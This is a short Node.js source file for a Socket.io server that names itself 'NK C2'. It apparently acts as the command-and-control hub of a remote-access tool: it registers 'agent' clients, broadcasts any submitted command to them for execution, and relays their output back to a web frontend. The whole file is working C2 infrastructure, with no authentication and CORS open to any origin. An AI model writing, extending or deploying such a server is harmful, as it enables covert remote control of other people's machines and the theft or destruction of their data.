const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(cors());
// Serve the Frontend (Public folder)
app.use(express.static(path.join(__dirname, 'public')));

let agents = new Map();

io.on('connection', (socket) => {
    // Identify
    socket.on('identify', ({ type, id }) => {
        if (type === 'agent') {
            agents.set(socket.id, id);
            console.log(`[AGENT] Connected: ${id}`);
            io.emit('log', `[SYSTEM] Agent ${id} online.`);
        } else {
            console.log('[UI] Frontend Connected');
        }
    });

    // Execute Command
    socket.on('cmd', (data) => {
        console.log(`[CMD] ${data.cmd}`);
        io.emit('exec', data); 
    });

    // Result from Agent
    socket.on('result', (data) => {
        io.emit('log', data.output);
    });

    socket.on('disconnect', () => {
        if (agents.has(socket.id)) {
            const id = agents.get(socket.id);
            io.emit('log', `[SYSTEM] Agent ${id} disconnected.`);
            agents.delete(socket.id);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`NK C2 running on port ${PORT}`));
